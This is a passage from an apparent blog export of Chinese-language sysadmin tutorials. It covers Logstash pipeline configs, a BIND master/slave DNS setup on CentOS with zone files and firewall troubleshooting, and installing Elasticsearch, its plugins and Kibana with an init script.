%&#123;WORD:loglevel&#125;%&#123;SPACE&#125;%&#123;NOTSPACE:loggername&#125; - %&#123;GREEDYDATA:msg&#125;\", \"message\", \"%&#123;GREEDYDATA:msg&#125;\" ] &#125;&#125;output&#123; if [type] == \"tomcat_card\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_card-%&#123;+YYYYY.MM.dd&#125;\" &#125;&#125; if [type] == \"tomcat_family\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_card-%&#123;+YYYYY.MM.dd&#125;\" &#125;&#125; if [type] == \"tomcat_mission\" &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" index =&gt; \"tomcat_mission-%&#123;+YYYYY.MM.dd&#125;\" &#125; &#125;&#125; logstash日志采集nginx配置/etc/logstash/conf.d/nginx.conf 123456789101112131415161718192021input &#123;file &#123;path =&gt; \"/data/wwwlogs/nginx_json.log\"codec =&gt; \"json\"&#125;&#125;filter &#123;mutate &#123;split =&gt; [ \"upstreamtime\", \",\" ]&#125;mutate &#123;convert =&gt; [ \"upstreamtime\", \"float\" ]&#125;&#125;output &#123;kafka &#123;bootstrap_servers =&gt; \"10.0.0.11:9092\"topic_id =&gt; \"logstash\"compression_type =&gt; \"gzip\"&#125;&#125; 创建一个从日志文件读取，并写入redis的配置文件(本文件采用默认方式进行输入，输出)123456789101112131415161718192021222324252627282930313233343536373839404142#cat agent.confinput &#123; file &#123; path =&gt; \"/var/log/httpd/access_log\" //设置读取的日志路径 sincedb_path =&gt; \"../.sincedb\" type =&gt; \"httpd\" start_position =&gt; \"beginning\" &#125;&#125;output &#123; redis &#123; host =&gt; [\"127.0.0.1\"] port =&gt; 6379 batch =&gt; true batch_events =&gt; 5 data_type =&gt; \"list\" key =&gt; \"logstash:redis\" &#125;&#125;配置一个从redis读取日志并输出到es的配置文件#cat index.confinput &#123; redis &#123; host =&gt; [\"127.0.0.1\"] port =&gt; 6379 data_type =&gt; \"list\" key =&gt; “log stash:redis\" &#125;&#125;output &#123; elasticsearch &#123; host =&gt; \"127.0.0.1\" protocol =&gt; \"http\" index =&gt; \"logstash-%&#123;type&#125;-%&#123;+YYYY.MM.dd&#125;\" index_type =&gt; \"%&#123;type&#125;\" &#125;&#125;启动logstash","raw":null,"content":null,"categories":[{"name":"日志分析平台","slug":"日志分析平台","permalink":"http://blog.yangcvo.me/categories/日志分析平台/"}],"tags":[{"name":"Log analysis platform","slug":"Log-analysis-platform","permalink":"http://blog.yangcvo.me/tags/Log-analysis-platform/"}]},{"title":"DNS服务器主从复制搭建","slug":"DNS/DNS服务器主从复制搭建","date":"2016-01-28T03:33:07.000Z","updated":"2017-03-16T06:19:36.000Z","comments":true,"path":"2016/01/28/DNS/DNS服务器主从复制搭建/","link":"","permalink":"http://blog.yangcvo.me/2016/01/28/DNS/DNS服务器主从复制搭建/","excerpt":"","text":"DNS 服务器主从复制搭建最近部署测试环境和灰度发布环境，之前已经整改过一次，因为需要扩容添加，所以这次操作就把实现的过程记录下来了。 实现环境：centos 6.7 x86_64 主DNS服务器：192.168.1.173 从DNS服务器：192.168.1.174 实验步骤1、关闭网络防火墙及SElinux（主从DNS服务器上都要有此操作） 123[root@LAN_redis2 ~]# /etc/init.d/iptables stop[root@LAN_redis2 ~]# /etc/init.d/iptables statusiptables: Firewall is not running. （注意：此步骤不容忽略，否则会吃大亏，比如我在此就耗费大半天的时间） 123[root@LAN_redis2 ~]# setenforce 0[root@LAN_redis2 ~]# getenforce Permissive（或是disable也可以） 主DNS服务器的安装及配置2、 安装DNS服务器 1234567891011[root@LAN_redis1 ~]# yum install bind bind-libs bind-utils -y[root@LAN_redis1 ~]# yum list all | grep ^bindbind.x86_64 32:9.8.2-0.47.rc1.el6 @basebind-libs.x86_64 32:9.8.2-0.47.rc1.el6 @basebind-utils.x86_64 32:9.8.2-0.47.rc1.el6 @basebind-chroot.x86_64 32:9.8.2-0.47.rc1.el6 basebind-devel.i686 32:9.8.2-0.47.rc1.el6 basebind-devel.x86_64 32:9.8.2-0.47.rc1.el6 basebind-dyndb-ldap.x86_64 2.3-8.el6 basebind-libs.i686 32:9.8.2-0.47.rc1.el6 basebind-sdb.x86_64 32:9.8.2-0.47.rc1.el6 base 3、修改配置文件/etc/named.conf 12[root@LAN_redis1 ~]# cp /etc/named.conf /etc/named.conf.bak (备份原始配置文件)[root@LAN_redis1 ~]# vim /etc/named.conf 对主配置文件进行编辑修改，也可以自己编写,这里是我设置的 1234567891011121314151617181920212223242526272829303132333435options &#123; listen-on port 53 &#123; any; &#125;; listen-on-v6 port 53 &#123; ::1; &#125;; directory \"/var/named\"; dump-file \"/var/named/data/cache_dump.db\"; statistics-file \"/var/named/data/named_stats.txt\"; memstatistics-file \"/var/named/data/named_mem_stats.txt\"; allow-query &#123; any; &#125;; recursion yes;// dnssec-enable yes;// dnssec-validation yes; /* Path to ISC DLV key */ pid-file \"/var/run/named/named.pid\";// bindkeys-file \"/etc/named.iscdlv.key\";// managed-keys-directory \"/var/named/dynamic\";&#125;;logging &#123; channel default_debug &#123; file \"data/named.run\"; severity dynamic; &#125;;&#125;;zone \".\" IN &#123; type hint; file \"named.ca\";&#125;;include \"/etc/named.rfc1912.zones\";#include \"/etc/named.root.key\"; named.conf文件说明：1234567891011121314151617181920212223242526上面的named.conf文件包括三部分：key,controls,logging，options,zone。在options中：directory \"/var/named\" :定义bind的工作目录为/var/named，配置文件中所有使用的相对路径，指的都是在这里配置的目录下。 pid-file \"/var/run/named/named.pid\"; 把bind程序运行的pid写入文件named.pidtransfer-format many-answers:使用更加有效的域传输格式many-answers。allow-query &#123; any; &#125;:允许所有用户查询dnslogging:设置日志服务器和日志信息的发送地。options:控制服务器的全局配置选项和为其它语句设置默认值zone:定义一个域,比如正解析域和反解析域。logging是定义日志的，不需要深究，主要是options和zone。在zone中：这里定义了两个zone，一个是正解析zone qbtop.com，一个是反解析zone 81.19.23.in-addr.arpa。他们的参数基本相同：type master:定义dns服务器为主dns。file \"qbtop.com.zone\":定义此zone的文件名。allow-transfer &#123; 23.19.81.194; &#125;:允许向从dns 23.19.81.194传输dns数据。唯一不同的是zone名称的定义，正解析zone名称的定义是受权的域名，可以是顶级域名，也可以是二级域名，或多级。反解析zone名称定义规定前部分ip倒着写。如ip 192.168.1.2,名称定义为1.168.192.in-addr.arpa。正解析qbtop.com.zone 编辑头文件配置1[root@LAN_redis1 etc]# vim named.rfc1912.zones 1234567891011121314151617181920212223zone \"1.0.0.127.in-addr.arpa\" IN &#123; type master; file \"named.loopback\"; allow-update &#123; none; &#125;;&#125;;zone \"0.in-addr.arpa\" IN &#123; type master; file \"named.empty\"; allow-update &#123; none; &#125;;&#125;;zone \"prod.intranet\" IN &#123; type master; file \"prod.intranet.zone\"; allow-transfer &#123; 192.168.1.174; &#125;;&#125;;zone \"1.168.192.in-addr.arpa\" IN &#123; type master; file \"192.168.1.zone\"; allow-transfer &#123; 192.168.1.174; &#125;;&#125;; 4、新建正反向解析文件并修改权限及属组 1[root@LAN_redis1 named]# vim prod.intranet.zone (正向解析配置文件) 123456789101112131415161718$TTL 1200@ IN SOA ns1.prod.intranet. admin.prod.intranet. ( //设置SOA标记、域名、域管理邮箱 2015120101 //更新序列号，用于标记地址数据库的变化 1H //刷新时间，从域名服务器更新该地址数据库文件的间隔时间 10M //重试延时，从域名服务器更新地址数据库失败以后，等待多长时间再次尝试 7D //失效时间，超过该时间仍无法更新地址数据库，则不再尝试 1D //设置无效地址解析记录（该数据库中不存在的地址）的默认缓存时间) IN NS ns1.prod.intranet. IN NS ns2.prod.intranet. IN MX 10 mail.prod.intranet.ns1.prod.intranet. IN A 192.168.1.173ns2.prod.intranet. IN A 192.168.1.174mysql.prod.intranet. IN A 192.168.1.171mysql-2.prod.intranet. IN A 192.168.1.170sentinel.prod.intranet. IN A 192.168.1.175redis1.prod.intranet. IN A 192.168.1.173redis2.prod.intranet. IN A 192.168.1.174 DNS正反解析： 正向解析就是将我们知道的域名解析成IP地址，而反向解析就是把正向解析掉了个方向，就是通过IP地址解析域名 反向域名解析与通常的正向域名解析相反，提供IP地址到域名的对应，反向域名格式如：X.X.X.in-addr.arpa。目前很多网络服务提供商要求访问的IP地址具有反向域名解析的结果，否则不提供服务。 通俗易懂的讲： 正向解析：通过域名查找ip； 反向解析：通过ip查找域名； 1vim /var/named/192.168.1.zone (逆向解析配置文件) 123456789101112131415161718192021$TTL 1200@ IN SOA ns1.prod.intranet. admin.prod.intranet. ( 2015120101 1H 10M 7D 1D) IN NS ns1.prod.intranet. IN NS ns2.prod.intranet. IN MX 10 mail.prod.intranet.173 IN PTR ns1.prod.intranet.174 IN PTR ns2.prod.intranet.170 IN PTR mysql.prod.intranet.171 IN PTR mysql-2.prod.intranet.172 IN PTR sentinel.prod.intranet.173 IN PTR redis1.prod.intranet.174 IN PTR redis2.prod.intranet.175 IN PTR tomcatA1.prod.intranet.176 IN PTR tomcatB1.prod.intranet. 修改文件的属主属组和访问权限 1234567891011[root@LAN_redis1 named]# chgrp -v named prod.intranet.zone\"prod.intranet.zone\" 的所属组已更改为named[root@LAN_redis1 named]# chgrp -v named 192.168.1.zone\"192.168.1.zone\" 的所属组已更改为named[root@LAN_redis1 named]# chmod o= 192.168.1.zone[root@LAN_redis1 named]# chmod o= prod.intranet.zone[root@LAN_redis1 named]# ll prod.intranet.zone 192.168.1.zone-rw-r-----. 1 root named 1700 6月 30 16:25 192.168.1.zone-rw-r-----. 1 root named 1922 6月 30 16:26 prod.intranet.zone 5、检查主配置文件和区域配置文件语法是否有错误 1234[root@LAN_redis1 ~]# named-checkconf /etc/named.conf[root@LAN_redis1 ~]# named-checkzone \"prod.intranet\" /var/named/prod.intranet.zone[root@LAN_redis1 ~]# named-checkzone \"1.168.192.in-addr.arpa\" /var/named/192.168.1.zoneok 6、启动named的服务和进程： 刚刚开始弄启动失败了。启动失败： 12345678910111213141516171819202122232425262728293031323334[root@LAN_redis1 ~]# service named start启动 named： [失败]然后定位查看原因：[root@LAN_redis1 ~]# tail /var/log/messagesJun 30 17:03:18 LAN_redis1 named[17582]: corporation. Support and training for BIND 9 areJun 30 17:03:18 LAN_redis1 named[17582]: available at https://www.isc.org/supportJun 30 17:03:18 LAN_redis1 named[17582]: ----------------------------------------------------Jun 30 17:03:18 LAN_redis1 named[17582]: adjusted limit on open files from 65535 to 1048576Jun 30 17:03:18 LAN_redis1 named[17582]: found 2 CPUs, using 2 worker threadsJun 30 17:03:18 LAN_redis1 named[17582]: using up to 4096 socketsJun 30 17:03:18 LAN_redis1 named[17582]: loading configuration from '/etc/named.conf'Jun 30 17:03:18 LAN_redis1 named[17582]: none:0: open: /etc/named.conf: permission deniedJun 30 17:03:18 LAN_redis1 named[17582]: loading configuration: permission deniedJun 30 17:03:18 LAN_redis1 named[17582]: exiting (due to fatal error)日志上面说没有权限访问 '/etc/named.conf'查看下[root@LAN_redis1 ~]# ll /etc/named*-rwxr-x--x. 1 root root 1019 6月 30 14:36 /etc/named.conf-rw-r-----. 1 root named 984 11月 20 2015 /etc/named.conf.bak-rw-r-----. 1 root root 1019 6月 30 16:38 /etc/named.conf.bak.2016-rw-r--r--. 1 root named 2389 5月 11 07:07 /etc/named.iscdlv.key-rw-r-----. 1 root named 1171 6月 30 15:28 /etc/named.rfc1912.zones-rw-r--r--. 1 root named 487 7月 19 2010 /etc/named.root.key然后修改属性和权限[root@LAN_redis1 ~]# chown -R root:named /etc/named[root@LAN_redis1 ~]# service named start启动 named： [确定]就可以了。 二、在上述前提下搭建备用从DNS服务器 在另一台服务器上安装bind，安装方法和上述一致 编辑主配置文件/etc/named.conf，和上述一致 编辑主配置文件中定义的头文件/etc/named.rfc1912.zones 12345678910111213141516171819202122232425262728zone \"1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa\" IN &#123; type master; file \"named.loopback\"; allow-update &#123; none; &#125;;&#125;;zone \"1.0.0.127.in-addr.arpa\" IN &#123; type master; file \"named.loopback\"; allow-update &#123; none; &#125;;&#125;;zone \"0.in-addr.arpa\" IN &#123; type slave; file \"named.empty\"; allow-update &#123; none; &#125;;&#125;;zone \"prod.intranet\" IN &#123; type slave; file \"slaves/prod.intranet.zone\"; // 正向解析，定义服务器类型，主服务器地址以及正向解析的配置文件名 masters &#123; 192.168.1.173; &#125;;&#125;;zone \"1.168.192.in-addr.arpa\" IN &#123; type slave; file \"slaves/192.168.1.zone\"; masters &#123; 192.168.1.173; &#125;; // 逆向解析&#125;; 注意：不需要配置指定文件salaves/prod.intranet.zone和slaves/192.168.1.zone,因为这是一个从服务器，所以它的所有条目都是同步主服务器里面的。从服务器的条目存放文件存放在slaves目录的是一种安全机制。 测试主配置文件和区域配置文件： 1[root@LAN_redis2 slaves]# named-checkconf /etc/named.conf 启动从DNS服务器上的named服务12345678910[root@LAN_redis2 slaves]# service named start启动 named： [确定][root@LAN_redis2 slaves]# chkconfig named on （将named服务设为开机自启动）[root@LAN_redis2 ~]# chkconfig --list namednamed 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭[root@LAN_redis2 ~]# cd /var/named/slaves/[root@LAN_redis2 slaves]# ll总用量 8-rw-r--r--. 1 named named 1105 6月 30 17:46 192.168.1.zone-rw-r--r--. 1 named named 947 6月 30 17:46 prod.intranet.zone 查看同步结果123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@LAN_redis2 slaves]# cat 192.168.1.zone$ORIGIN .$TTL 1200 ; 20 minutes1.168.192.in-addr.arpa IN SOA ns1.prod.intranet. admin.prod.intranet. ( 2016030101 ; serial 3600 ; refresh (1 hour) 600 ; retry (10 minutes) 604800 ; expire (1 week) 86400 ; minimum (1 day) ) NS ns1.prod.intranet. NS ns2.prod.intranet.$ORIGIN 1.168.192.in-addr.arpa.170 PTR mysql.prod.intranet.171 PTR mysql-2.prod.intranet.172 PTR sentinel.prod.intranet.173 PTR ns1.prod.intranet. PTR redis1.prod.intranet.174 PTR ns2.prod.intranet. PTR redis2.prod.intranet.root@LAN_redis2 slaves]# cat prod.intranet.zone$ORIGIN .$TTL 1200 ; 20 minutesprod.intranet IN SOA ns1.prod.intranet. admin.prod.intranet. ( 2016030101 ; serial 3600 ; refresh (1 hour) 600 ; retry (10 minutes) 604800 ; expire (1 week) 86400 ; minimum (1 day) ) NS ns1.prod.intranet. NS ns2.prod.intranet.$ORIGIN prod.intranet.10001 A 192.168.1.18110002 A 192.168.1.18110003 A 192.168.1.18110004 A 192.168.1.18110005 A 192.168.1.18110006 A 192.168.1.18110007 A 192.168.1.18110008 A 192.168.1.18110009 A 192.168.1.18110010 A 192.168.1.18110011 A 192.168.1.181 此时，看的以上两个文件已经自动从主服务器上同步到从服务器上，表明实验成功。 以后每次，主服务器上更新正反向解析文件的话，从服务器上的解析文件会自动与之同步。可以看到，在主服务器更新的数据、序列号，在从服务器上都自动更新过来了，表明验证成功。 其他服务器测试：我先到D1：192.168.1.178 添加新的DNS： 12345[root@tomcat_D1 ~]# vim /etc/resolv.conf#namserver 233.5.5.5 注释掉阿里云的DNS nameserver 192.168.1.173nameserver 192.168.1.174 保存退出，测试是否可以ping外网是否可以解析设置好的内网域名。 12345[root@tomcat_D1 ~]# ping www.baidu.comping: unknown host www.baidu.com[root@tomcat_D1 ~]# ping 10002.prod.intranet.ping: unknown host 10002.prod.intranet. 都是提示这个错误。 无法解析，后面我看我做的负载均衡反向代理域名都正常的。 后来定位是什么原因导致的，可是DNS上面主从正常的。 回到主从： 1234567891011121314151617181920[root@LAN_redis1 named]# nslookup 10001.prod.intranetServer: 127.0.0.1Address: 127.0.0.1#53Name: 10001.prod.intranetAddress: 192.168.1.181[root@LAN_redis1 named]#[root@LAN_redis1 named]# nslookup 10002.prod.intranetServer: 127.0.0.1Address: 127.0.0.1#53Name: 10002.prod.intranetAddress: 192.168.1.181[root@LAN_redis2 slaves]# nslookup 192.168.1.175Server: 127.0.0.1Address: 127.0.0.1#53175.1.168.192.in-addr.arpa name = tomcatA1.prod.intranet. 这里解析正常的，很奇怪。逆解析也正常。 问题解决：后来我看了很久，发现原来是我DNS 防火墙开启了，可是没有把DNS 端口53没有开放。 12-A INPUT -p tcp -m state --state NEW -m tcp --dport 53 -j ACCEPT-A INPUT -p udp -m state --state NEW -m udp --dport 53 -j ACCEPT 添加了防火墙规则已经可以了。 123[root@tomcat_D1 ~]# ping 10001.prod.intranet.PING 10001.prod.intranet (192.168.1.181) 56(84) bytes of data.64 bytes from 10003.prod.intranet (192.168.1.181): icmp_seq=1 ttl=64 time=0.843 ms","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"DNS","slug":"DNS","permalink":"http://blog.yangcvo.me/tags/DNS/"}]},{"title":"ELK(Elasticsearch + Logstash + Kibana)搭建日志集中分析平台实践","slug":"日志分析\u0010平台/Elasticsearch/ELK-Elasticsearch-Logstash-Kibana-搭建日志集中分析平台实践","date":"2016-01-21T09:56:03.000Z","updated":"2017-03-28T07:30:04.000Z","comments":true,"path":"2016/01/21/日志分析\u0010平台/Elasticsearch/ELK-Elasticsearch-Logstash-Kibana-搭建日志集中分析平台实践/","link":"","permalink":"http://blog.yangcvo.me/2016/01/21/日志分析\u0010平台/Elasticsearch/ELK-Elasticsearch-Logstash-Kibana-搭建日志集中分析平台实践/","excerpt":"","text":"关注可参考：本文将安装Elasticsearch-1.7.2, Logstash-1.5.5, Kibana-4.1.5。 请注意版本要求，有些组件需要响应的版本要求。logstash是负责搜集和转发日志的，es用于存储和检索，kibana提供web端的展现…他们是独立运行的，也可以部署在同一台机器，也可以不同的机器。 可以关注我的Github上面有详细文档：https://github.com/yangcvo/ELK 启动脚本下载：https://github.com/yangcvo/ELK 详细配置优化做集群与写收集日志规则教程: https://github.com/yangcvo/ELK 组件预览 JDK http://www.oracle.com/technetwork/java/javase/downloads/index.html Elasticsearch https://www.elastic.co/downloads/elasticsearch Logstash https://www.elastic.co/downloads/logstash Kibana下载地址:https://www.elastic.co/downloads/kibana redis下载地址: http://redis.io/download 准备工作:服务端：系统centos 6.7 ip:192.168.1.234 JDK1.8 Elasticsearch-1.7.2 Kibana-4.1.2客户端：系统centos 6.7 ip:192.168.1.235 JDK1.8 Logash-1.4.2 基本配置设置FQDN：1234567891011121314151617181920创建SSL证书的时候需要配置FQDN#修改hostnamecat /etc/hostnameelk#修改hostscat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.1.234 elk.ooxx.com elk#刷新环境hostname -F /etc/hostname#复查结果hostname -felk.ooxx.comhostnameelk 关闭防火墙1234567891011#service iptables stop#setenforce 0不过这里我防火墙是开启的，后期添加出去端口即可。或者可以不关闭防火墙，但是要在iptables中打开相关的端口：# vim /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT# service iptables restart 安装java：12345ElasticSearch和Logstash依赖于JDK，所以需要安装JDK：# yum -y install java-1.8.0-openjdk*# java -version这里我是用yum安装方法，也可以自行下载tar包，注意设置java路径。java也可到这个地址下载https://www.reucon.com/cdn/java/ 安装Elasticsearch：1234567891011121314151617RPM安装下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。.以 CentOS 下使用安装包RPM安装＃mkdir -p /opt/software &amp;&amp; cd /opt/software＃wget -c https://download.elastic.co/elasticsearch/elasticsearch/elasticsearch-1.7.2.noarch.rpm＃rpm -ivh elasticsearch-1.7.2.noarch.rpm可以自定义下存储文件目录 用RPM 安装。vim /etc/elasticsearch/elasticsearch.ymlcluster.name: graylog-developmentnode.data: trueindex.number_of_shards: 5index.number_of_replicas: 1path.data: /home/data/es-data 自定存储目录path.work: /home/data/es-worknetwork.host: 192.168.1.234 启动es相关服务12service elasticsearch startservice elasticsearch status es源码安装123456789101112131415这里我是源码安装的下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。Elasticsearch - https://www.elastic.co/downloads/elasticsearchtar -zxvf elasticsearch-1.7.1.tar.gz -C /usr/local/ cd /usr/local/elasticsearch-1.7.1/config/然后给目录做个软链接：ln -s elasticsearch-1.7.1/ /usr/local/elasticsearch这里需要修改配置文件：配置前先创建几个目录文件mkdir /data/es-data -p mkdir /data/es-work -p mkdir /usr/local/elasticsearch-1.7.1/config/logs mkdir /usr/local/elasticsearch-1.7.1/config/plugins 配置Elasticsearch：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566vim elasticsearch.ymlcluster.name: elasticsearch 集群名称 #################################### Node ###################################### Node names are generated dynamically on startup, so you're relieved# from configuring them manually. You can tie this node to a specific name:#node.name: “linux_es” 这里我做了集群所以需要两个节点，这里我写了一个节点名称# Every node can be configured to allow or deny being eligible as the master,# and to allow or deny to store the data.## Allow this node to be eligible as a master node (enabled by default):#node.master: true 集群master 启动## Allow this node to store data (enabled by default):#node.data: true 数据存放true# Set the number of shards (splits) of an index (5 by default):#index.number_of_shards: 5# Set the number of replicas (additional copies) of an index (1 by default):#index.number_of_replicas: 1#################################### Paths ##################################### Path to directory containing configuration (this file and logging.yml):#path.conf: /usr/local/elasticsearch/config 这里开启es配置文件目录路径# Path to directory where to store index data allocated for this node.#path.data: /data/es-data es数据存放目录 这里需要自己新建目录## Can optionally include more than one location, causing data to be striped across# the locations (a la RAID 0) on a file level, favouring locations with most free# space on creation. For example:##path.data: /path/to/data1,/path/to/data2# Path to temporary files:#path.work: /data/es-work # Path to log files:#path.logs: /usr/local/elasticsearch/logs es的存放日志 这里需要自己创建下文件# Path to where plugins are installed:#path.plugins: /usr/local/elasticsearch/plugins es安装插件存放路径## Set this property to true to lock the memory:#bootstrap.mlockall: true 源码安装启动需要执行 ：/usr/local/elasticsearch/bin/elasticsearch才能启动； 1234567891011121314151617181920212223242526272829303132333435这里需要/etc/init.d/创建启动脚本。可以到我github上面下载。[root@ELK elasticsearch-servicewrapper]# mv service/ /usr/local/elasticsearch/bin/[root@ELK elasticsearch-servicewrapper]# cd /usr/local/elasticsearch[root@ELK elasticsearch]# /usr/local/elasticsearch/bin/service/elasticsearch install 这里是安装esDetected RHEL or Fedora:Installing the Elasticsearch daemon..[root@ELK elasticsearch]# vim /etc/init.d/elasticsearch 查看安装es启动配置文件[root@ELK elasticsearch]# service elasticsearch start 启动es Starting Elasticsearch...Waiting for Elasticsearch......running: PID:31360 服务已启动了。启动相关服务service elasticsearch startservice elasticsearch status配置 elasticsearch 服务随系统自动启动# chkconfig --add elasticsearch测试ElasticSearch服务是否正常，预期返回200的状态码# curl -X GET http://localhost:9200&#123; \"name\" : \"elk\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"-4Rqn4IzS1GfnsodqZD8Tg\", \"version\" : &#123; \"number\" : \"1.7.2\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-01-03T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 安装 head、marvel、bigdesk插件:head插件123456789101112插件安装方法1：/usr/local/elasticsearch/bin/plugin -install mobz/elasticsearch-head重启es 即可。打开http://localhost:9200/_plugin/head/插件安装方法2：1.https://github.com/mobz/elasticsearch-head下载zip 解压2.建立elasticsearch-1.0.0\\plugins\\head\\_site文件3.将解压后的elasticsearch-head-master文件夹下的文件copy到_site重启es 即可。打开http://localhost:9200/_plugin/head/ Marvel插件123456789101112Elasticsearch 的集群和数据管理界面 Marvel 非常赞，可惜只对开发环境免费，参考链接：https://www.elastic.co/guide/en/marvel/current/configuration.html插件安装/usr/local/elasticsearch/bin/plugin -i elasticsearch/marvel/latest重启es 即可。完成后重启服务访问 http://192.168.1.234:9200/_plugin/marvel/如何看不到下面的页面，就修改下这里的参数看看有没有配置：vim elasticsearch.yml network.host: 192.168.1.234 在重启es 然后在查看就有数据。 bigdesk插件123456看需求安装功能: 监控查看cpu、内存使用情况,索引数据、搜索情况,http连接数等安装#/elstaicsearch/bin/plugin -i lukas-vlcek/bigdesk重启es 即可。完成后重启服务访问 http://192.168.1.234:9200/_plugin/bigdesk 安装Kibana:在es机器上面安装kibana. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134到https://www.elastic.co/downloads/kibana 找合适的版本。每个版本下面有这么一行内容，一定要注意这些内容：Compatible with Elasticsearch 1.4.4 - 1.7cd /opt/software/ &amp;&amp; wget https://download.elastic.co/kibana/kibana/kibana-4.1.2-linux-x64.tar.gz#解压＃tar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/local ＃cd /usr/local/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana#创建kibana启动脚本服务vi /etc/rc.d/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functions start() &#123; echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi&#125;reload()&#123; echo \"Reload command is not implemented for this service.\" return $RETVAL&#125;stop() &#123; echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE&#125; case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 &#123;start|stop|status|restart&#125;\" &gt;&amp;2exit 2 ;;esac#修改启动权限chmod +x /etc/rc.d/init.d/kibana#启动kibana服务service kibana startservice kibana status#查看端口netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/java tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/java tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshd tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/node tcp 0 0 :::22 :::* LISTEN 1509/sshd 配置Kibana：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#编辑kibana.yaml 修改端口，设置host 可以设置本地服务器IPvi /usr/local/kibana/config/kibana.yml# Kibana is served by a back end server. This controls which port to use.port: 5601# The host to bind the server to.host: \"0.0.0.0\"# The Elasticsearch instance to use for all your queries.elasticsearch_url: \"http://localhost:9200\"# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,# then the host you use to connect to *this* Kibana instance will be sent.elasticsearch_preserve_host: true# Kibana uses an index in Elasticsearch to store saved searches, visualizations# and dashboards. It will create a new index if it doesn't already exist.kibana_index: \".kibana\"# If your Elasticsearch is protected with basic auth, this is the user credentials# used by the Kibana server to perform maintence on the kibana_index at statup. Your Kibana# users will still need to authenticate with Elasticsearch (which is proxied thorugh# the Kibana server)# kibana_elasticsearch_username: user# kibana_elasticsearch_password: pass# If your Elasticsearch requires client certificate and key# kibana_elasticsearch_client_crt: /path/to/your/client.crt# kibana_elasticsearch_client_key: /path/to/your/client.key# If you need to provide a CA certificate for your Elasticsarech instance, put# the path of the pem file here.# ca: /path/to/your/CA.pem# The default application to load.default_app_id: \"discover\"# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to# request_timeout setting# ping_timeout: 1500# Time in milliseconds to wait for responses from the back end or elasticsearch.# This must be &gt; 0request_timeout: 300000# Time in milliseconds for Elasticsearch to wait for responses from shards.# Set to 0 to disable.shard_timeout: 0# Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying# startup_timeout: 5000# Set to false to have a complete disregard for the validity of the SSL# certificate.verify_ssl: true# SSL for outgoing requests from the Kibana Server (PEM formatted)# ssl_key_file: /path/to/your/server.key# ssl_cert_file: /path/to/your/server.crt# Set the path to where you would like the process id file to be created.# pid_file: /var/run/kibana.pid# If you would like to send the 